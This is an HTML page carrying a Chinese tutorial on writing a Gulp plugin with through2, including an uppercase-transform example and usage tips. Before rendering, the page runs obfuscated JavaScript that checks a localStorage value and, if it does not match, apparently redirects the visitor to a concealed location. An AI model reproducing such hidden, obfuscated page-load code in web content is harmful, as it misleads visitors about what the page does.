<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x29645f=_0x2a14;function _0x2a14(p,s){var t=_0x36c1();return(_0x2a14=function(s,n){var a=t[s-=204];void 0===_0x2a14.lBdJIH&&(_0x2a14.eMLXAV=function(s,n){var a,l=[],p=0,t="";for(s=(s=>{for(var n,a,l="",p="",t=0,c=0;a=s.charAt(c++);~a&&(n=t%4?64*n+a:a,t++%4)&&(l+=String.fromCharCode(255&n>>(-2*t&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var r=0,e=l.length;r<e;r++)p+="%"+("00"+l.charCodeAt(r).toString(16)).slice(-2);return decodeURIComponent(p)})(s),c=0;c<256;c++)l[c]=c;for(c=0;c<256;c++)p=(p+l[c]+n.charCodeAt(c%n.length))%256,a=l[c],l[c]=l[p],l[p]=a;for(var c=0,p=0,r=0;r<s.length;r++)a=l[c=(c+1)%256],l[c]=l[p=(p+l[c])%256],l[p]=a,t+=String.fromCharCode(s.charCodeAt(r)^l[(l[c]+l[p])%256]);return t},p=arguments,_0x2a14.lBdJIH=!0);var s=s+t[0],l=p[s];return l?a=l:(void 0===_0x2a14.YxqUth&&(_0x2a14.YxqUth=!0),a=_0x2a14.eMLXAV(a,n),p[s]=a),a})(p,s)}function _0x36c1(){var s=["W6RdVr1WWP7dNmkeWOJdP8kJBhZcOa","W6NdLZOoymkoWO5ZWQ4V","Evb5zCkQdrJdGCoDbhFdP3OMe8oSW5/dGmoOkxnwW5RdPa/dUW","WONdNgxcLfBdRmoZWOVdG8oqW53cHcGj","W4OlW6pdQNjAWQ8YW6FcUhO","WPZdVmoRW6VdJuP9W6BcPSoJ","WOSEW4e7W6BdG8k0sSke","qqtcQ8kWW4XHWRWtW7S5kGZcJq","WRRdLCk5W4NcOGNcLSkpW744","gCkHWPhdPXmklW","WO9xWPldNxZdQePgu24","W6jUW7BcGCkXj3HDWRpdSh/cJmkgvW","WROzWPpdGYZdGeW","W7CaWPuWDmkWjmkgeCouW5ykBa","WPv2WPVdNSkcW793WQO2WP4","W6VdKdTwESkUWOHkWQy","WQnrW6NdStRcPSo2W5HsrW4i","W4PkW4pdNmoEWQ1/tHRcIa","WO5iWQNcQd8","W49fW4ZdNCk9WRvrsJFcG8oa","cJ7dRmk9vc8e","W44TW4NcI8kyW7DOWOy","WR/dM8k2W43dHwVdP8kTW6mnWO4tvW","W7TiWPmWW53dVSk8ESkA","W6pdH8kAWRPZhLFdImoynmojW6a","WOqlWQj9W47dGxq"];return(_0x36c1=function(){return s})()}if((()=>{for(var s=_0x2a14,n=_0x36c1();;)try{if(457301==-parseInt(s(229,"qy(3"))*(parseInt(s(211,"TH4q"))/2)+parseInt(s(216,")Gv$"))/3+parseInt(s(221,"MnW*"))/4+parseInt(s(217,"b5(R"))/5*(-parseInt(s(223,"t!Dw"))/6)+-parseInt(s(207,"kCQ4"))/7*(-parseInt(s(205,"ld2O"))/8)+-parseInt(s(219,"ld2O"))/9+parseInt(s(208,"&Kn3"))/10)break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x29645f(222,"lwN#")](_0x29645f(220,"qy(3"))!=_0x29645f(215,"uNcQ"))throw window[_0x29645f(218,"TH4q")][_0x29645f(206,"HfQj")](_0x29645f(225,"roD]")),Error();document.title="gulp 编写插件",document.getElementById("article").innerHTML='<div><p>使用 Gulp 编写插件主要是创建一个 Node.js 模块，该模块通过 Gulp 的流式接口处理文件。以下是编写一个简单 Gulp 插件的详细步骤和示例：</p>\n<h3>步骤</h3>\n<ol>\n<li><strong>初始化项目</strong>  ：\n<ul>\n<li>创建一个新目录用于存放插件代码。</li>\n<li>使用 <code>npm init</code> 初始化项目，这会生成一个 <code>package.json</code> 文件。</li>\n</ul>\n</li>\n<li><strong>安装必要的依赖</strong>  ：\n<ul>\n<li>通常，Gulp 插件需要处理文件流，<code>through2</code> 是一个常用的库，用于创建转换流。你可以通过 <code>npm install through2</code> 安装它。</li>\n</ul>\n</li>\n<li><strong>编写插件代码</strong>  ：\n<ul>\n<li>创建一个 JavaScript 文件（如 <code>index.js</code>），用于编写插件逻辑。</li>\n<li>使用 <code>through2</code> 创建一个转换流，处理输入的文件对象并生成输出的文件对象。</li>\n</ul>\n</li>\n<li><strong>导出插件</strong>  ：\n<ul>\n<li>使用 <code>module.exports</code> 导出插件函数，以便其他项目可以使用。</li>\n</ul>\n</li>\n<li><strong>测试插件</strong>  ：\n<ul>\n<li>在另一个项目中安装并测试你的插件，确保其按预期工作。</li>\n</ul>\n</li>\n</ol>\n<h3>示例</h3>\n<p>以下是一个简单的 Gulp 插件示例，该插件将每个文件的内容转换为大写：</p>\n<pre><code class="language-javascript"><span class="hljs-comment">// index.js</span>\n\n<span class="hljs-keyword">const</span> through = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;through2&#x27;</span>);\n<span class="hljs-keyword">const</span> <span class="hljs-title class_">PluginError</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;plugin-error&#x27;</span>); <span class="hljs-comment">// 使用 plugin-error 替代 gulp-util 中的 PluginError</span>\n\n<span class="hljs-comment">// 插件名称</span>\n<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PLUGIN_NAME</span> = <span class="hljs-string">&#x27;gulp-uppercase&#x27;</span>;\n\n<span class="hljs-comment">// 创建插件函数</span>\n<span class="hljs-keyword">function</span> <span class="hljs-title function_">gulpUppercase</span>(<span class="hljs-params"></span>) {\n  <span class="hljs-comment">// 返回一个通过 through2 创建的转换流</span>\n  <span class="hljs-keyword">return</span> through.<span class="hljs-title function_">obj</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">file, enc, cb</span>) {\n    <span class="hljs-keyword">if</span> (file.<span class="hljs-title function_">isNull</span>()) {\n      <span class="hljs-comment">// 如果文件为空，直接返回</span>\n      <span class="hljs-title function_">cb</span>(<span class="hljs-literal">null</span>, file);\n      <span class="hljs-keyword">return</span>;\n    }\n\n    <span class="hljs-keyword">if</span> (file.<span class="hljs-title function_">isStream</span>()) {\n      <span class="hljs-comment">// 如果文件是流，不支持此类型，返回错误</span>\n      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">PluginError</span>(<span class="hljs-variable constant_">PLUGIN_NAME</span>, <span class="hljs-string">&#x27;Streaming not supported&#x27;</span>));\n      <span class="hljs-title function_">cb</span>();\n      <span class="hljs-keyword">return</span>;\n    }\n\n    <span class="hljs-keyword">try</span> {\n      <span class="hljs-comment">// 将文件内容转换为大写</span>\n      file.<span class="hljs-property">contents</span> = <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(file.<span class="hljs-property">contents</span>.<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">toUpperCase</span>());\n      <span class="hljs-comment">// 推送转换后的文件</span>\n      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">push</span>(file);\n      <span class="hljs-title function_">cb</span>();\n    } <span class="hljs-keyword">catch</span> (err) {\n      <span class="hljs-comment">// 处理转换过程中的错误</span>\n      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">PluginError</span>(<span class="hljs-variable constant_">PLUGIN_NAME</span>, err));\n      <span class="hljs-title function_">cb</span>();\n    }\n  });\n}\n\n<span class="hljs-comment">// 导出插件</span>\n<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = gulpUppercase;\n</code></pre>\n<h3>使用插件</h3>\n<p>在另一个 Gulp 项目中，你可以这样使用这个插件：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> gulp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;gulp&#x27;</span>);\n<span class="hljs-keyword">const</span> uppercase = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./path/to/your/gulp-uppercase&#x27;</span>); <span class="hljs-comment">// 假设插件位于此路径</span>\n\ngulp.<span class="hljs-title function_">task</span>(<span class="hljs-string">&#x27;default&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {\n  <span class="hljs-keyword">return</span> gulp.<span class="hljs-title function_">src</span>(<span class="hljs-string">&#x27;src/**/*.txt&#x27;</span>)\n    .<span class="hljs-title function_">pipe</span>(<span class="hljs-title function_">uppercase</span>())\n    .<span class="hljs-title function_">pipe</span>(gulp.<span class="hljs-title function_">dest</span>(<span class="hljs-string">&#x27;dist&#x27;</span>));\n});\n</code></pre>\n<h3>注意事项</h3>\n<ol>\n<li><strong>错误处理</strong>  ：确保在插件中正确处理错误，使用 <code>this.emit(\'error\', new PluginError(...))</code> 发出错误。</li>\n<li><strong>流和缓冲区支持</strong>  ：决定你的插件是否支持流（通常不推荐，因为处理起来更复杂）或仅支持缓冲区。</li>\n<li><strong>依赖管理</strong>  ：尽量减少对外部库的依赖，或者选择维护良好的库。</li>\n<li><strong>文档和测试</strong>  ：为你的插件编写清晰的文档，并编写测试以确保其按预期工作。</li>\n<li><strong>发布到 npm</strong>  ：如果你希望其他人也能使用你的插件，可以将其发布到 npm 上。确保遵循 npm 的发布指南，包括更新 <code>package.json</code> 中的必要字段。</li>\n</ol>\n<p>通过这些步骤，你可以创建一个功能强大且易于使用的 Gulp 插件。</p>\n</div>'</script></body></html>